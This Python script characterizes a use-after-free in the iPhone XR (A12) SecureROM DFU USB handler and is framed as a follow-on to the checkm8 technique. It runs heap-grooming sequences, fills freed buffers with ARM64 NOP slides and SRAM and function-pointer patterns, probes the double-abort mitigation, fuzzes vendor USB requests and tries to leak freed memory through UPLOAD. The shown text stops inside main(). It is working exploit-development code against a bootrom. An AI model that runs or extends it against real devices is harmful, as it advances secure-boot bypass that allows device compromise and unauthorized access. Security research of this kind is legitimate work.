#!/usr/bin/env python3
"""
A12 DNLOAD/ABORT UAF — Enhanced Characterization v2
=====================================================
Building on v1 findings (crash at cycle 1, confirmed with 2048B payload):

This script adds CRITICAL tests focused on the actual checkm8 exploitation
mechanism adapted for A12 (T8020) where the ZLP heap leak is patched.

Tests:
  A - Stall-based grooming (checkm8 core technique)
      Send DNLOAD with large wLength but only partial data → EP0 stalls
      This creates controllable allocations WITHOUT the ZLP leak path
  B - Incomplete transfer sizes (how much data triggers the allocation?)
  C - Write-to-freed patterns (control what's in the freed io_buffer)
  D - USB reset as UAF trigger (reset instead of abort)
  E - Double-abort probing (A12's double-abort mitigation test)
  F - Vendor request heap manipulation (DWC3-specific requests)
  G - Controlled heap layout via alternating alloc/free patterns
  H - UPLOAD after DNLOAD/ABORT (read back freed memory?)

Target: iPhone XR (A12/T8020) in DFU mode
Author: Research tool for A12 SecureROM analysis
"""
import time, struct, json, argparse, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID   = 0x1227
BUF_SZ    = 0x800  # 2048 bytes — DFU buffer size on A12

def backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

def connect():
    d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend())
    if d:
        try: d.set_configuration()
        except: pass
    return d

def alive():
    try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend()) is not None
    except: return False

def get_status(d):
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4]} if len(r) >= 6 else None
    except: return None

def clear_status(d):
    try: d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    except: pass

def abort(d):
    try: d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except: pass

def reset_idle(d):
    for _ in range(20):
        st = get_status(d)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10:
            clear_status(d)
        else:
            abort(d)
        time.sleep(0.05)
    return False

def wait_dfu(timeout_s=120):
    log(f"  Waiting for DFU device (max {timeout_s}s)... Put device in DFU mode.")
    for i in range(timeout_s):
        d = connect()
        if d:
            st = get_status(d)
            if st and st["bState"] == 2:
                log(f"  Device found after {i+1}s (IDLE)")
                return d
            if st and st["bState"] == 10:
                clear_status(d)
                time.sleep(0.2)
                d2 = connect()
                if d2:
                    log(f"  Device found after {i+1}s (cleared error)")
                    return d2
        time.sleep(1)
        if i % 10 == 9:
            log(f"  Still waiting... ({i+1}s)")
    log("  Timeout waiting for device")
    return None

def ctrl_raw(d, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout=2000):
    """Raw control transfer, returns data or True/False"""
    try:
        r = d.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout=timeout)
        return r
    except usb.core.USBError as e:
        return e

def usb_reset(d):
    """Send USB bus reset"""
    try:
        d.reset()
        return True
    except:
        return False

# ================================================================
# TEST A: Stall-based grooming (checkm8 core technique)
# ================================================================
def test_A_stall_grooming(d):
    """
    The checkm8 exploit uses a STALL on EP0 to create controllable allocations.
    Technique: send a SETUP packet for DNLOAD with large wLength, but only
    send partial data (less than wLength). This causes EP0 to stall.
    The partial data is still written to the io_buffer.
    
    On A12, the double-abort mitigates the ZLP leak, but does it affect
    the stall-based allocation pattern?
    
    We test:
    1. DNLOAD with wLength=0x800 but send only N bytes (N < 0x800)
    2. Check if device stalls, accepts, or crashes
    3. Try ABORT after stall to see if the io_buffer is freed
    """
    log("\n" + "="*60)
    log("TEST A: Stall-based EP0 grooming")
    log("="*60)
    
    results = []
    
    # Test various partial sizes
    partial_sizes = [0, 1, 8, 64, 128, 256, 512, 1024, 2047]
    
    for psz in partial_sizes:
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        payload = bytes([0x42] * psz) if psz > 0 else b""
        log(f"  Partial send: wLength=0x800, actual={psz}B")
        
        t0 = time.perf_counter()
        try:
            # DNLOAD request — the USB stack expects 0x800 bytes
            # but we only provide psz bytes
            # pyusb sends the data in the control transfer
            # To truly send partial data, we need to use the raw transfer
            r = d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            st = get_status(d)
            state = st["bState"] if st else None
            log(f"    OK: state={state}, time={dt:.1f}ms")
            
            # Now try ABORT
            abort(d)
            st2 = get_status(d)
            state2 = st2["bState"] if st2 else None
            
            results.append({
                "partial_size": psz, "ok": True, "state_after": state,
                "state_after_abort": state2, "time_ms": round(dt, 2)
            })
            
        except usb.core.USBError as e:
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            if not alive():
                log(f"    CRASH! time={dt:.1f}ms")
                results.append({
                    "partial_size": psz, "crashed": True, "error": str(e),
                    "time_ms": round(dt, 2)
                })
                d = wait_dfu(90)
                if not d: break
            else:
                st = get_status(d)
                state = st["bState"] if st else None
                log(f"    Error: {e}, state={state}, time={dt:.1f}ms")
                results.append({
                    "partial_size": psz, "error": str(e), "state": state,
                    "time_ms": round(dt, 2)
                })
                if state == 10: clear_status(d)
    
    return {"test": "A_stall_grooming", "results": results}


# ================================================================
# TEST B: Incomplete transfer — send request but don't complete DATA phase
# ================================================================
def test_B_incomplete_transfer(d):
    """
    Try to trigger an incomplete DATA phase on DNLOAD.
    Use short timeouts and various techniques to interrupt the transfer.
    This probes whether io_buffer gets allocated before data is fully received.
    """
    log("\n" + "="*60)
    log("TEST B: Incomplete transfer probing")
    log("="*60)
    
    results = []
    
    # Test 1: Very short timeout on DNLOAD
    timeouts = [1, 5, 10, 50, 100, 500]
    
    for to_ms in timeouts:
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        payload = b"\x43" * BUF_SZ
        log(f"  DNLOAD with timeout={to_ms}ms")
        
        t0 = time.perf_counter()
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=to_ms)
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            st = get_status(d)
            state = st["bState"] if st else None
            log(f"    Completed in {dt:.1f}ms, state={state}")
            
            # Immediately abort
            abort(d)
            st2 = get_status(d)
            
            results.append({
                "timeout_ms": to_ms, "completed": True, "time_ms": round(dt, 2),
                "state": state, "post_abort_state": st2["bState"] if st2 else None
            })
            
        except usb.core.USBError as e:
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            if not alive():
                log(f"    CRASH after {dt:.1f}ms")
                results.append({"timeout_ms": to_ms, "crashed": True, "time_ms": round(dt, 2)})
                d = wait_dfu(90)
                if not d: break
            else:
                log(f"    Timeout/error after {dt:.1f}ms: {e}")
                st = get_status(d)
                results.append({
                    "timeout_ms": to_ms, "error": str(e), "time_ms": round(dt, 2),
                    "state": st["bState"] if st else None
                })
                if st and st["bState"] == 10: clear_status(d)
    
    return {"test": "B_incomplete_transfer", "results": results}


# ================================================================
# TEST C: Write-to-freed patterns — control freed io_buffer content
# ================================================================
def test_C_write_to_freed(d):
    """
    After DNLOAD/ABORT frees the io_buffer, the UAF means the pointer
    is still dangling. If we can write controlled data to the same heap slot
    BEFORE the next DNLOAD uses it, we control what the freed buffer contains.
    
    Strategy:
    1. DNLOAD(pattern_A) → ABORT (frees buffer with pattern_A content)
    2. Try to allocate NEW data that lands in the same slot
    3. DNLOAD(pattern_B) → see if crash behavior changes based on content
    
    We use different patterns to see if content affects crash:
    - All zeros (safe NOP slide)
    - Valid SRAM pointers (0x19C0xxxxx range)
    - Function pointer spray
    - 0xDEADBEEF markers
    """
    log("\n" + "="*60)
    log("TEST C: Write-to-freed patterns")
    log("="*60)
    
    patterns = {
        "zeros":     b"\x00" * BUF_SZ,
        "nop_slide": b"\x1f\x20\x03\xd5" * (BUF_SZ // 4),  # ARM64 NOP
        "sram_ptrs": struct.pack("<Q", 0x19C018800) * (BUF_SZ // 8),  # SRAM base spray
        "deadbeef":  struct.pack("<I", 0xDEADBEEF) * (BUF_SZ // 4),
        "func_ptr":  struct.pack("<Q", 0x100000000) * (BUF_SZ // 8),  # SecureROM base
        "callback":  b"\x00" * 0x20 + struct.pack("<Q", 0x19C018800) + b"\x00" * (BUF_SZ - 0x28),
    }
    
    results = []
    
    for name, pattern in patterns.items():
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        log(f"  Pattern: {name}")
        
        # Cycle 0: DNLOAD(pattern) → ABORT
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, pattern, timeout=2000)
            abort(d)
        except usb.core.USBError:
            if not alive():
                log(f"    CRASH at cycle 0! (pattern={name})")
                results.append({"pattern": name, "crashed_at": 0})
                d = wait_dfu(90)
                if not d: break
                continue
        
        st = get_status(d)
        if st and st["bState"] == 10:
            clear_status(d)
        
        # Cycle 1: DNLOAD(same pattern) → ABORT  
        # This is where the UAF crash happens
        t0 = time.perf_counter()
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, pattern, timeout=2000)
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            # Try abort if DNLOAD succeeded
            abort(d)
            
            st = get_status(d)
            if not alive():
                log(f"    CRASH after abort at cycle 1 (time={dt:.1f}ms)")
                results.append({"pattern": name, "crashed_at": 1, "time_ms": round(dt, 2), "phase": "abort"})
                d = wait_dfu(90)
                if not d: break
            else:
                log(f"    SURVIVED! state={st['bState'] if st else 'NONE'} (time={dt:.1f}ms)")
                results.append({"pattern": name, "survived": True, "time_ms": round(dt, 2), "state": st["bState"] if st else None})
                
        except usb.core.USBError as e:
            t1 = time.perf_counter()
            dt = (t1 - t0) * 1000
            
            if not alive():
                log(f"    CRASH at cycle 1 DNLOAD (time={dt:.1f}ms)")
                results.append({"pattern": name, "crashed_at": 1, "time_ms": round(dt, 2), "phase": "dnload", "error": str(e)})
                d = wait_dfu(90)
                if not d: break
            else:
                log(f"    Error but alive: {e}")
                results.append({"pattern": name, "error": str(e), "time_ms": round(dt, 2)})
    
    return {"test": "C_write_to_freed", "results": results}


# ================================================================
# TEST D: USB reset as UAF trigger (instead of ABORT)
# ================================================================
def test_D_usb_reset_trigger(d):
    """
    Instead of ABORT after DNLOAD, send a USB bus reset.
    On A12, the USB reset handler calls abort() TWICE on EP0_IN.
    This tests whether the USB reset path triggers a different crash.
    """
    log("\n" + "="*60)
    log("TEST D: USB reset as trigger (vs ABORT)")
    log("="*60)
    
    results = []
    
    # Test 1: DNLOAD → USB_RESET (no abort)
    log("  D1: DNLOAD → USB_RESET")
    if not reset_idle(d):
        d = wait_dfu(90)
        if not d: return {"test": "D_usb_reset", "error": "no_device"}
        reset_idle(d)
    
    payload = b"\x44" * BUF_SZ
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
        t0 = time.perf_counter()
        usb_reset(d)
        time.sleep(1)
        t1 = time.perf_counter()
        
        d2 = connect()
        if d2:
            st = get_status(d2)
            log(f"    After reset: alive, state={st['bState'] if st else 'NONE'}")
            results.append({"variant": "dnload_reset", "alive": True, "state": st["bState"] if st else None})
            d = d2
        else:
            log(f"    After reset: device gone")
            results.append({"variant": "dnload_reset", "alive": False})
            d = wait_dfu(90)
            if not d: return {"test": "D_usb_reset", "results": results, "error": "lost_device"}
    except usb.core.USBError as e:
        log(f"    Error: {e}")
        results.append({"variant": "dnload_reset", "error": str(e)})
        d = wait_dfu(90) or connect()
    
    # Test 2: DNLOAD → ABORT → USB_RESET (single DNLOAD/ABORT + reset)
    log("  D2: DNLOAD → ABORT → USB_RESET")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            abort(d)
            usb_reset(d)
            time.sleep(1)
            
            d2 = connect()
            if d2:
                st = get_status(d2)
                log(f"    After reset: alive, state={st['bState'] if st else 'NONE'}")
                results.append({"variant": "dnload_abort_reset", "alive": True, "state": st["bState"] if st else None})
                d = d2
            else:
                log(f"    After reset: device gone")
                results.append({"variant": "dnload_abort_reset", "alive": False})
                d = wait_dfu(90)
        except usb.core.USBError as e:
            results.append({"variant": "dnload_abort_reset", "error": str(e)})
            d = wait_dfu(90) or connect()
    
    # Test 3: DNLOAD → ABORT → DNLOAD → USB_RESET (crash cycle with reset instead of abort)
    log("  D3: DNLOAD → ABORT → DNLOAD → USB_RESET")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            abort(d)
            st = get_status(d)
            if st and st["bState"] == 10: clear_status(d)
            
            # Second DNLOAD — this is where UAF crash happens normally
            t0 = time.perf_counter()
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
                usb_reset(d)
                time.sleep(1)
                t1 = time.perf_counter()
                
                d2 = connect()
                if d2:
                    st = get_status(d2)
                    log(f"    After cycle+reset: alive, state={st['bState'] if st else 'NONE'}")
                    results.append({"variant": "cycle_reset", "alive": True, "time_ms": round((t1-t0)*1000, 2)})
                    d = d2
                else:
                    log(f"    After cycle+reset: device gone (CRASH)")
                    results.append({"variant": "cycle_reset", "crashed": True, "time_ms": round((time.perf_counter()-t0)*1000, 2)})
                    d = wait_dfu(90)
            except usb.core.USBError as e:
                if not alive():
                    log(f"    CRASH during second DNLOAD")
                    results.append({"variant": "cycle_reset", "crashed": True, "phase": "second_dnload"})
                    d = wait_dfu(90)
                else:
                    results.append({"variant": "cycle_reset", "error": str(e)})
        except usb.core.USBError as e:
            results.append({"variant": "cycle_reset", "error_early": str(e)})
            d = wait_dfu(90) or connect()
    
    return {"test": "D_usb_reset", "results": results}


# ================================================================
# TEST E: Double-abort probing (A12 mitigation behavior)
# ================================================================
def test_E_double_abort(d):
    """
    A12's mitigation calls abort() TWICE on EP0_IN during USB reset.
    Let's explicitly test double-abort sequences to understand the mitigation.
    
    1. DNLOAD → ABORT → ABORT (explicit double abort)
    2. DNLOAD → ABORT → ABORT → DNLOAD (does double abort prevent crash?)
    3. Multiple ABORT without DNLOAD
    """
    log("\n" + "="*60)
    log("TEST E: Double-abort mitigation probing")
    log("="*60)
    
    results = []
    
    # E1: DNLOAD → double ABORT → check state
    log("  E1: DNLOAD → ABORT → ABORT")
    if not reset_idle(d):
        d = wait_dfu(90)
        if not d: return {"test": "E_double_abort", "error": "no_device"}
        reset_idle(d)
    
    payload = b"\x45" * BUF_SZ
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
        abort(d)
        time.sleep(0.01)
        abort(d)  # Second abort — mimics A12 behavior
        
        st = get_status(d)
        state1 = st["bState"] if st else None
        log(f"    After double abort: state={state1}")
        
        if state1 == 10: clear_status(d)
        
        # Now try second DNLOAD cycle — does double abort prevent crash?
        st2 = get_status(d)
        if st2 and st2["bState"] == 2:
            t0 = time.perf_counter()
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
                abort(d)
                t1 = time.perf_counter()
                
                if alive():
                    log(f"    Double-abort + cycle 2: SURVIVED! ({(t1-t0)*1000:.1f}ms)")
                    results.append({"variant": "double_abort_cycle", "survived": True})
                else:
                    log(f"    Double-abort + cycle 2: CRASHED")
                    results.append({"variant": "double_abort_cycle", "crashed": True})
                    d = wait_dfu(90)
                    if not d: return {"test": "E_double_abort", "results": results}
            except usb.core.USBError as e:
                if not alive():
                    log(f"    CRASH: {e}")
                    results.append({"variant": "double_abort_cycle", "crashed": True, "error": str(e)})
                    d = wait_dfu(90)
                else:
                    results.append({"variant": "double_abort_cycle", "error": str(e)})
        else:
            results.append({"variant": "double_abort_cycle", "state_after_double": state1})
    except usb.core.USBError as e:
        results.append({"variant": "double_abort_cycle", "error": str(e)})
        if not alive():
            d = wait_dfu(90)
    
    # E2: Triple abort (overkill test)
    log("  E2: DNLOAD → ABORT × 3")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            for _ in range(3):
                abort(d)
                time.sleep(0.005)
            
            st = get_status(d)
            if st and st["bState"] == 10: clear_status(d)
            
            # Cycle 2
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
                abort(d)
                
                if alive():
                    log(f"    Triple-abort + cycle 2: SURVIVED!")
                    results.append({"variant": "triple_abort_cycle", "survived": True})
                else:
                    log(f"    Triple-abort + cycle 2: CRASHED")
                    results.append({"variant": "triple_abort_cycle", "crashed": True})
                    d = wait_dfu(90)
            except usb.core.USBError as e:
                crashed = not alive()
                results.append({"variant": "triple_abort_cycle", "crashed": crashed, "error": str(e)})
                if crashed: d = wait_dfu(90)
        except usb.core.USBError as e:
            results.append({"variant": "triple_abort", "error": str(e)})
            if not alive(): d = wait_dfu(90)
    
    # E3: Abort spam without prior DNLOAD
    log("  E3: ABORT × 10 (no DNLOAD)")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        abort_results = []
        for i in range(10):
            abort(d)
            st = get_status(d)
            state = st["bState"] if st else None
            abort_results.append(state)
        log(f"    States after 10 aborts: {abort_results}")
        results.append({"variant": "abort_spam_no_dnload", "states": abort_results, "alive": alive()})
    
    return {"test": "E_double_abort", "results": results}


# ================================================================
# TEST F: Vendor request heap manipulation
# ================================================================
def test_F_vendor_requests(d):
    """
    DWC3 USB controller and Apple's SecureROM may accept vendor-specific
    USB requests that allocate/free heap memory. These could serve as
    alternative heap grooming primitives to replace the patched ZLP leak.
    
    Known interesting request types:
    - bmRequestType 0x40 (vendor, host-to-device)
    - bmRequestType 0xC0 (vendor, device-to-host)
    - Apple DFU-specific requests
    """
    log("\n" + "="*60)
    log("TEST F: Vendor request heap probing")
    log("="*60)
    
    results = []
    
    # Vendor OUT requests (host→device, potentially allocate buffers)
    vendor_out_ids = list(range(0, 16)) + [64, 65, 66, 160, 161, 255]
    
    log("  F1: Vendor OUT requests (0x40)")
    for req_id in vendor_out_ids:
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        # Try with small data
        data = b"\x00" * 64
        try:
            r = d.ctrl_transfer(0x40, req_id, 0, 0, data, timeout=500)
            st = get_status(d)
            log(f"    VendorOUT req={req_id}: OK, state={st['bState'] if st else 'NONE'}")
            results.append({"type": "vendor_out", "req": req_id, "accepted": True, "state": st["bState"] if st else None})
        except usb.core.USBError as e:
            if not alive():
                log(f"    VendorOUT req={req_id}: CRASH!")
                results.append({"type": "vendor_out", "req": req_id, "crashed": True})
                d = wait_dfu(90)
                if not d: break
            else:
                # STALL or error — expected for unsupported requests
                results.append({"type": "vendor_out", "req": req_id, "error": str(e)})
    
    # Vendor IN requests (device→host, potentially read/allocate)
    log("  F2: Vendor IN requests (0xC0)")
    for req_id in vendor_out_ids:
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        try:
            r = d.ctrl_transfer(0xC0, req_id, 0, 0, 256, timeout=500)
            data_hex = r.tobytes().hex() if hasattr(r, 'tobytes') else bytes(r).hex()
            log(f"    VendorIN req={req_id}: got {len(r)}B: {data_hex[:64]}...")
            results.append({"type": "vendor_in", "req": req_id, "length": len(r), "data_hex": data_hex[:128]})
        except usb.core.USBError as e:
            if not alive():
                log(f"    VendorIN req={req_id}: CRASH!")
                results.append({"type": "vendor_in", "req": req_id, "crashed": True})
                d = wait_dfu(90)
                if not d: break
            else:
                results.append({"type": "vendor_in", "req": req_id, "error": str(e)})
    
    # DFU class requests with unusual wValue/wIndex
    log("  F3: DFU requests with non-zero wValue/wIndex")
    interesting = [
        (0x21, 1, 1, 0, b"\x00"*64, "DNLOAD wValue=1"),
        (0x21, 1, 0, 1, b"\x00"*64, "DNLOAD wIndex=1"),
        (0xA1, 2, 0, 0, 2048, "UPLOAD wValue=0"),
        (0xA1, 2, 1, 0, 2048, "UPLOAD wValue=1"),
        (0xA1, 2, 0, 1, 2048, "UPLOAD wIndex=1"),
        (0xA1, 5, 0, 0, 6, "GETSTATE"),
        (0x21, 1, 0, 0, b"\x00"*4096, "DNLOAD 4096B (oversized)"),
    ]
    
    for bmrt, breq, wval, widx, data_or_len, desc in interesting:
        if not reset_idle(d):
            d = wait_dfu(90)
            if not d: break
            reset_idle(d)
        
        try:
            r = d.ctrl_transfer(bmrt, breq, wval, widx, data_or_len, timeout=1000)
            if isinstance(data_or_len, int):
                data_hex = bytes(r).hex()[:64] if r is not None and len(r) > 0 else ""
                log(f"    {desc}: got {len(r)}B {data_hex}")
                results.append({"type": "dfu_unusual", "desc": desc, "length": len(r), "data": data_hex})
            else:
                log(f"    {desc}: OK")
                results.append({"type": "dfu_unusual", "desc": desc, "ok": True})
        except usb.core.USBError as e:
            if not alive():
                log(f"    {desc}: CRASH!")
                results.append({"type": "dfu_unusual", "desc": desc, "crashed": True})
                d = wait_dfu(90)
                if not d: break
            else:
                results.append({"type": "dfu_unusual", "desc": desc, "error": str(e)})
    
    return {"test": "F_vendor_requests", "results": results}


# ================================================================
# TEST G: Controlled heap layout via alloc/free pattern
# ================================================================
def test_G_heap_layout(d):
    """
    Try to create a predictable heap layout using multiple small operations
    before triggering the UAF. The goal is to understand heap allocation patterns.
    
    Technique:
    1. Send multiple DNLOAD/ABORT cycles with different sizes
    2. Between each, send GET_STATUS (which may allocate a small buffer)
    3. Try to fill heap holes before the UAF trigger
    """
    log("\n" + "="*60)
    log("TEST G: Heap layout manipulation")
    log("="*60)
    
    results = []
    
    # G1: Warm up the heap with many small operations
    log("  G1: Heap warmup (50 GET_STATUS calls)")
    if not reset_idle(d):
        d = wait_dfu(90)
        if not d: return {"test": "G_heap_layout", "error": "no_device"}
        reset_idle(d)
    
    warmup_states = []
    for i in range(50):
        st = get_status(d)
        if st:
            warmup_states.append(st["bState"])
        else:
            warmup_states.append(None)
            break
    
    log(f"    Warmup states (unique): {list(set(warmup_states))}")
    
    # Now trigger UAF — does the warmup change crash behavior?
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, b"\x47" * BUF_SZ, timeout=2000)
        abort(d)
        st = get_status(d)
        if st and st["bState"] == 10: clear_status(d)
        
        t0 = time.perf_counter()
        d.ctrl_transfer(0x21, 1, 0, 0, b"\x47" * BUF_SZ, timeout=2000)
        t1 = time.perf_counter()
        
        if alive():
            log(f"    After warmup + UAF trigger: SURVIVED!")
            results.append({"variant": "warmup_50_gs", "survived": True, "time_ms": round((t1-t0)*1000, 2)})
        else:
            log(f"    After warmup + UAF trigger: CRASHED")
            results.append({"variant": "warmup_50_gs", "crashed": True, "time_ms": round((t1-t0)*1000, 2)})
            d = wait_dfu(90)
    except usb.core.USBError as e:
        crashed = not alive()
        results.append({"variant": "warmup_50_gs", "crashed": crashed, "error": str(e)})
        if crashed: d = wait_dfu(90)
    
    # G2: Interleave small and large DNLOAD/ABORT before trigger
    log("  G2: Interleaved sizes before trigger")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        sizes = [64, 256, 512, 64, 256, 512, 1024, 64, 2048]
        ok_count = 0
        for sz in sizes:
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * sz, timeout=2000)
                abort(d)
                st = get_status(d)
                if st and st["bState"] == 10: clear_status(d)
                ok_count += 1
            except usb.core.USBError:
                if not alive():
                    log(f"    CRASH during heap shaping at size {sz}")
                    results.append({"variant": "interleaved_sizes", "crashed_during_shaping": True, "at_size": sz, "ok_count": ok_count})
                    d = wait_dfu(90)
                    break
        else:
            # All shaping ops succeeded, now trigger
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, b"\x47" * BUF_SZ, timeout=2000)
                abort(d)
                
                if alive():
                    log(f"    After shaping: alive (survived {ok_count + 1} cycles!)")
                    results.append({"variant": "interleaved_sizes", "total_cycles": ok_count + 1, "survived": True})
                else:
                    log(f"    After shaping: crashed at final cycle")
                    results.append({"variant": "interleaved_sizes", "total_cycles": ok_count + 1, "crashed": True})
                    d = wait_dfu(90)
            except usb.core.USBError as e:
                crashed = not alive()
                results.append({"variant": "interleaved_sizes", "crashed": crashed, "error": str(e)})
                if crashed: d = wait_dfu(90)
    
    return {"test": "G_heap_layout", "results": results}


# ================================================================
# TEST H: UPLOAD after DNLOAD/ABORT — read back freed memory?
# ================================================================
def test_H_upload_leak(d):
    """
    After DNLOAD/ABORT, the io_buffer may contain stale data.
    DFU UPLOAD (bRequest=2) reads from io_buffer.
    If the io_buffer pointer is dangling after abort, UPLOAD might
    read from freed/reallocated memory — potential info leak.
    """
    log("\n" + "="*60)
    log("TEST H: UPLOAD after DNLOAD/ABORT (info leak)")
    log("="*60)
    
    results = []
    
    # H1: Fresh UPLOAD (no prior DNLOAD)
    log("  H1: Fresh UPLOAD")
    if not reset_idle(d):
        d = wait_dfu(90)
        if not d: return {"test": "H_upload_leak", "error": "no_device"}
        reset_idle(d)
    
    try:
        r = d.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=2000)
        data = bytes(r)
        nonzero = sum(1 for b in data if b != 0)
        log(f"    Fresh UPLOAD: {len(data)}B, {nonzero} non-zero bytes")
        log(f"    First 64B: {data[:64].hex()}")
        results.append({
            "variant": "fresh_upload", "length": len(data),
            "nonzero_count": nonzero, "first_64": data[:64].hex()
        })
    except usb.core.USBError as e:
        log(f"    Fresh UPLOAD failed: {e}")
        results.append({"variant": "fresh_upload", "error": str(e)})
    
    # H2: DNLOAD(pattern) → UPLOAD (should see our pattern)
    log("  H2: DNLOAD(0xBB) → UPLOAD")
    if not reset_idle(d):
        d = wait_dfu(90)
        if not d: return {"test": "H_upload_leak", "results": results}
        reset_idle(d)
    
    pattern = b"\xBB" * BUF_SZ
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, pattern, timeout=2000)
        # Don't abort — let it stay in DNLOAD-IDLE
        st = get_status(d)
        log(f"    After DNLOAD: state={st['bState'] if st else 'NONE'}")
        
        # Now UPLOAD
        r = d.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=2000)
        data = bytes(r)
        match = sum(1 for b in data if b == 0xBB)
        log(f"    UPLOAD: {len(data)}B, {match}/{len(data)} match 0xBB")
        log(f"    First 64B: {data[:64].hex()}")
        results.append({
            "variant": "dnload_then_upload", "length": len(data),
            "pattern_match": match, "first_64": data[:64].hex()
        })
    except usb.core.USBError as e:
        log(f"    Failed: {e}")
        results.append({"variant": "dnload_then_upload", "error": str(e)})
        if not alive():
            d = wait_dfu(90)
    
    # H3: DNLOAD(0xCC) → ABORT → UPLOAD (read freed buffer?)
    log("  H3: DNLOAD(0xCC) → ABORT → UPLOAD (stale data?)")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        pattern2 = b"\xCC" * BUF_SZ
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, pattern2, timeout=2000)
            abort(d)
            st = get_status(d)
            if st and st["bState"] == 10: clear_status(d)
            
            # UPLOAD — io_buffer may still point to freed memory
            r = d.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=2000)
            data = bytes(r)
            match_cc = sum(1 for b in data if b == 0xCC)
            nonzero = sum(1 for b in data if b != 0)
            log(f"    UPLOAD after abort: {len(data)}B, {match_cc} x 0xCC, {nonzero} non-zero")
            log(f"    First 64B: {data[:64].hex()}")
            results.append({
                "variant": "dnload_abort_upload", "length": len(data),
                "cc_match": match_cc, "nonzero": nonzero, "first_64": data[:64].hex()
            })
        except usb.core.USBError as e:
            if not alive():
                log(f"    CRASH during upload after abort!")
                results.append({"variant": "dnload_abort_upload", "crashed": True})
                d = wait_dfu(90)
            else:
                log(f"    Error: {e}")
                results.append({"variant": "dnload_abort_upload", "error": str(e)})
    
    # H4: DNLOAD → ABORT → DNLOAD(0xDD) → ABORT → UPLOAD 
    # (after UAF trigger, can we still upload?)
    log("  H4: Full UAF cycle → UPLOAD")
    if d and not reset_idle(d):
        d = wait_dfu(90)
    if d:
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\xDD" * BUF_SZ, timeout=2000)
            abort(d)
            st = get_status(d)
            if st and st["bState"] == 10: clear_status(d)
            
            # This is the UAF trigger cycle
            d.ctrl_transfer(0x21, 1, 0, 0, b"\xEE" * BUF_SZ, timeout=2000)
            # If we get here without crash, try upload
            try:
                r = d.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=2000)
                data = bytes(r)
                log(f"    Post-UAF UPLOAD: {len(data)}B")
                log(f"    First 64B: {data[:64].hex()}")
                results.append({
                    "variant": "post_uaf_upload", "length": len(data),
                    "first_64": data[:64].hex()
                })
            except usb.core.USBError as e:
                results.append({"variant": "post_uaf_upload", "upload_error": str(e)})
        except usb.core.USBError as e:
            if not alive():
                log(f"    CRASH at UAF trigger (expected)")
                results.append({"variant": "post_uaf_upload", "crashed_at_trigger": True})
                d = wait_dfu(90)
            else:
                results.append({"variant": "post_uaf_upload", "error": str(e)})
    
    return {"test": "H_upload_leak", "results": results}


# ================================================================
# MAIN
# ================================================================
def main():
    p = argparse.ArgumentParser(description="A12 UAF Enhanced Characterization v2")
    p.add_argument("--test", default="all",
                   choices=["all", "A", "B", "C", "D", "E", "F", "G", "H"])
    p.add_argument("--auto-wait", action="store_true", default=True,
                   help="Auto-wait for DFU after crash (default: on)")
    args = p.parse_args()
    
    log("=" * 60)
    log("A12 DNLOAD/ABORT UAF — Enhanced Characterization v2")
    log(f"Target: iPhone XR (T8020) in DFU mode")
    log("=" * 60)
    
    d = connect()
    if not d:
        log("No DFU device found. Put iPhone in DFU mode.")
        d = wait_dfu(120)
        if not d:
            log("FATAL: No device found")
            return
    
